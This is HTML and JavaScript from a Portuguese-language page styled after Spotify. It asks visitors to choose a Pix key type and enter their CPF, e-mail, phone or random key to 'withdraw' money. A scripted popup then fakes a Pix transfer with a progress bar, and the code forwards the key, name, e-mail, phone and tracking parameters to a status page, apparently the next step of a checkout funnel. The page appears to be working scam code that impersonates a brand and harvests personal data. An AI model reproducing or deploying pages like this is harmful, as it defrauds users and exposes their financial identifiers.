    <p style="font-size:14px;">Tipo chave Pix:</p>

    <div id="botaperguntas">
      <div class="opcao-pix" data-tipo="cpf" onclick="selecionarPix(this)">👤<br>CPF/CNPJ</div>
      <div class="opcao-pix" data-tipo="email" onclick="selecionarPix(this)">✉️<br>E-MAIL</div>
      <div class="opcao-pix" data-tipo="aleatoria" onclick="selecionarPix(this)">🎲<br>ALEATÓRIA</div>
      <div class="opcao-pix" data-tipo="telefone" onclick="selecionarPix(this)">📞<br>TELL</div>
    </div>

    <input id="nomeInput" placeholder="Selecione o tipo de chave Pix" disabled="">
    <div id="mensagemAjuda"></div>

    <button id="meuBotao" disabled="">PREENCHA AS INFORMAÇÕES</button>

    <p id="descricaoiniciospotifyy">
      Este site é protegido pelo reCAPTCHA e está sujeito à
      <a href="https://www.spotify.com/br-pt/legal/privacy-policy/" target="_blank" rel="noopener noreferrer"
        style="color:rgb(1,214,97); font-weight:500; text-decoration:none;">
        Política de Privacidade
      </a>
      e aos
      <a href="https://policies.google.com/terms?hl=pt-BR" target="_blank" rel="noopener noreferrer"
        style="color:rgb(1,214,97); font-weight:500; text-decoration:none;">
        Termos de Serviço do Google
      </a>.
    </p>

  <!-- SCRIPT -->
  <script>
    const params = new URLSearchParams(window.location.search);
    const nomeParam = params.get("nome");

    if (nomeParam) {
      document.getElementById("mensagem").innerText = decodeURIComponent(nomeParam.replace(/\+/g, ' '));
    } else {
      document.getElementById("mensagem").innerText = "visitante";
    }
    let tipoPix = null;
    const input = document.getElementById('nomeInput');
    const botao = document.getElementById('meuBotao');
    const ajuda = document.getElementById('mensagemAjuda');

    const placeholders = {
      cpf: "Digite seu CPF ou CNPJ",
      email: "Digite seu e-mail Pix",
      aleatoria: "Digite sua chave aleatória",
      telefone: "Digite seu telefone com DDD"
    };
    const mensagens = {
      cpf: "Chaves CPF/CNPJ têm prioridade no processamento.",
      email: "Chaves por e-mail podem levar até 1 minuto.",
      aleatoria: "Recomendado por segurança.",
      telefone: "Número deve estar vinculado ao Pix."
    };

    function selecionarPix(el) {
      document.querySelectorAll('.opcao-pix').forEach(b => b.classList.remove('ativa'));
      el.classList.add('ativa');
      tipoPix = el.dataset.tipo;
      input.disabled = false;
      input.placeholder = placeholders[tipoPix];
      ajuda.innerText = mensagens[tipoPix];
      validar();
    }

    input.addEventListener('input', validar);

    function validar() {
      if (tipoPix && input.value.trim().length > 3) {
        botao.classList.add('ativo');
        botao.disabled = false;
        botao.innerText = "REALIZAR SAQUE VIA PIX";
        botao.onclick = redirecionarProximoPasso; // 🔑 AQUI
      } else {
        botao.classList.remove('ativo');
        botao.disabled = true;
        botao.innerText = "PREENCHA AS INFORMAÇÕES";
        botao.onclick = null;
      }
    }

    function redirecionarProximoPasso() {
      const popup = document.getElementById('popupProcessamento');
      const texto = document.getElementById('textoProcessamento');
      const barra = document.getElementById('barraProg');

      popup.style.display = "flex";

      const etapas = [
        { t: "Validando dados…", p: 30 },
        { t: "Transferindo para sistema Pix…", p: 65 },
        { t: "Processando pagamento…", p: 100 }
      ];

      let i = 0;
      const anim = setInterval(() => {
        texto.innerText = etapas[i].t;
        barra.style.width = etapas[i].p + "%";
        i++;
        if (i >= etapas.length) clearInterval(anim);
      }, 1400);

      setTimeout(() => {
        const params = new URLSearchParams(window.location.search);
        const nome = params.get("nome"); // Already decoded by browser usually, but better safe
        const pix = input.value.trim();

        // Salva dados usando CheckoutUtils se disponivel
        if (window.CheckoutUtils) {
          const dataToSave = {};
          if (nome) dataToSave.name = nome;

          // Tenta identificar o que é o PIX
          // FIX: Não salvar PIX como CPF ou Telefone para não sujar dados de checkout
          // if (tipoPix === 'cpf') dataToSave.cpf = pix;
          // if (tipoPix === 'telefone') dataToSave.phone = pix;

          CheckoutUtils.saveData(dataToSave);
        }

        const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content']
          .map(p => {
            const v = localStorage.getItem(p);
            return v ? `${p}=${encodeURIComponent(v)}` : '';
          })
          .filter(Boolean)
          .join('&');

        let urlDestino = `/status/?`;
        // Usa CheckoutUtils para gerar URL se possível, ou mantém logica manual
        // Manual é mais seguro aqui pois sabemos exatamente o destino (/status/) e parametros especificos
        if (nome) urlDestino += `nome=${encodeURIComponent(nome)}&`;
        urlDestino += `pix=${encodeURIComponent(pix)}`;

        // Adiciona dados extras para redundancia na URL
        const savedData = window.CheckoutUtils ? CheckoutUtils.getData() : {};
        if (savedData.email) urlDestino += `&email=${encodeURIComponent(savedData.email)}`;
        if (savedData.phone && tipoPix !== 'telefone') urlDestino += `&phone=${encodeURIComponent(savedData.phone)}`;

        if (utmParams) urlDestino += `&${utmParams}`;

        window.location.href = urlDestino;
      }, 4800);
    }
  </script>

  <div id="popupProcessamento">

  <style>
    #popupProcessamento {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, .9);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .popupBox {
      background: #0c0c0c;
      border: 1px solid #1f1f1f;
      border-radius: 16px;
      padding: 26px 22px;
      width: 90%;
      max-width: 340px;
      text-align: center;
    }

    .loader {
      width: 52px;
      height: 52px;
      border: 4px solid #333;
      border-top: 4px solid rgb(1, 214, 97);
      border-radius: 50%;
      margin: 0 auto 16px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg)
      }
    }

    #textoProcessamento {
      font-size: 15px;
      margin-bottom: 14px;
    }

    .barra {
      width: 100%;
      height: 8px;
      background: #1f1f1f;
      border-radius: 999px;
      overflow: hidden;
    }

    .barra span {
      display: block;
      height: 100%;
      width: 0%;
      background: rgb(1, 214, 97);
      transition: width .4s;
    }
  </style>
